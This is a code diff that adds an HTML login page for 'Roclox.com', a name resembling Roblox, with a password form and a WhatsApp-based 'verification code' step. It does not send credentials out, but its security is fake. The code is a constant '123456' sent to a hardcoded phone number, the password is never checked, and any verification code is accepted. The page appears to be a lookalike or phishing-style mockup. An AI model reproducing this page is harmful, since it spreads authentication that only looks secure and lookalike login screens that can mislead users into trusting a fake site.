@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Roclox.com</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #e3e3e3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #f2f2f2;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 300px;
+        }
+        .login-container h2 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0073e6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .login-container button:hover {
+            background-color: #005bb5;
+        }
+        .login-container p {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .login-container p a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+        #verification-section {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login to Roclox.com</h2>
+        <form id="loginForm">
+            <div id="login-section">
+                <input type="text" id="username" name="username" placeholder="Username" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </div>
+            <div id="verification-section">
+                <input type="text" id="verification-code" name="verification-code" placeholder="Verification Code" required>
+                <button type="submit">Verify</button>
+            </div>
+        </form>
+        <p>Don't have an account? <a href="#">Sign up now</a></p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const loginSection = document.getElementById('login-section');
+            const verificationSection = document.getElementById('verification-section');
+            
+            if (loginSection.style.display !== 'none') {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                const isTwoStepEnabled = true; // Assume 2-step verification is enabled
+
+                if (isTwoStepEnabled) {
+                    // Send verification code to WhatsApp
+                    const verificationCode = '123456'; // Replace with actual code generation
+                    const message = `Verification code: ${verificationCode}`;
+                    const whatsappNumber = '0621332641';
+                    const whatsappUrl = `https://api.whatsapp.com/send?phone=${whatsappNumber}&text=${encodeURIComponent(message)}`;
+                    
+                    window.open(whatsappUrl, '_blank');
+
+                    loginSection.style.display = 'none';
+                    verificationSection.style.display = 'block';
+                } else {
+                    // Proceed with login if 2-step verification is not enabled
+                }
+            } else {
+                const verificationCode = document.getElementById('verification-code').value;
+
+                const isValidCode = true; // Assume verification code is correct
+
+                if (isValidCode) {
+                    alert("Verification successful!");
+                } else {
+                    alert("Invalid verification code. Please try again.");
+                }
+            }
+        });
+    </script>
+</body>
+</html>
